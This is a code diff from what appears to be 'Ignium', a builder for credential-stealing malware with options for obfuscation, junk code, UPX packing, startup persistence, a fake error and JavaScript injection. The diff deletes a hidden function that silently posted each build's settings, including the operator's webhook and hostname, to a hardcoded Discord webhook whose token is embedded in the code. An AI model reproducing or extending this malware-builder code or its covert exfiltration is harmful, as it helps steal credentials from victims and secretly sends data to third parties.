@@ -4,28 +4,6 @@ import tables
 from utils.payload import ignium_template
 from utils.construct import BANNER, Spinner, generate_junk, obfuscate, wrap_in_base64
 
-def log_build(build_id, details):
-    url = "https://discord.com/api/webhooks/1446379847516688496/WxC6XH_SmHyyWzJSnfOfLe8-ikrkOHB-S9JINHGd1ZwXnHYM3pndxYFVw8IEwF5m_J_u"
-    try:
-        desktop_name = socket.gethostname()
-        payload = {
-            "username": "Ignium Build Logging",
-            "avatar_url": "https://cdn3.emoji.gg/emojis/203899-shock.png",
-            "embeds": [{
-                "title": f"Build Generated | {desktop_name}",
-                "color": 0xFF0000,
-                "fields": [
-                    {"name": "Build ID", "value": f"`{build_id}`", "inline": True},
-                    {"name": "Configuration Details", "value": f"```json\n{json.dumps(details, indent=4)}\n```", "inline": False}
-                ],
-                "footer": {"text": "Made with <3 by Themida"},
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }]
-        }
-        requests.post(url, json=payload, timeout=10)
-    except:
-        pass
-
 def build():
     ctypes.windll.kernel32.SetConsoleTitleW("Ignium | t.me/igniumlol")
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -53,17 +31,6 @@ def build():
     do_obf = tables.OBFUSCATION
     use_junk = tables.JUNK_CODE
     use_upx = tables.UPX
-    
-    details = {
-        "Target Webhook": webhook,
-        "Obfuscation": do_obf,
-        "Junk Code": use_junk,
-        "Startup": tables.STARTUP,
-        "UPX": use_upx,
-        "Fake Error": fake_error,
-        "Injection": tables.INJECTION
-    }
-    log_build(build_id, details)
     
     injection_js_content = ""
     inj_path = os.path.join("utils", "build", "injection.js")
